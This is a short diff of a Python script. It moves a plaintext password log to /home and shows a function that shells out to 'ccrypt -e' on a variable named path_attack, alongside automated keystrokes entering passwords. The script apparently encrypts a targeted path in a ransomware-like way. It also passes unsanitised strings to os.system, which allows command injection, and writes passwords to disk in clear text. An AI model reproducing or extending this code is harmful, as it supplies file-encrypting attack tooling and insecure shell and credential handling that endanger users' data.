@@ -28,7 +28,7 @@ def insert():
         p.press('enter')
         p.write(password)
         p.press('enter')
-        with open('/password.txt','a') as pwdfile:                                      # SAFE PASSWORD IN '/'
+        with open('/home/password.txt','a') as pwdfile:                                      # SAFE PASSWORD IN '/'
             pwdfile.write('File Name: '+  file + '\nPassword File: ' +password+'\n\n')
 def cy():
   os.system('ccrypt -e ' + path_attack)
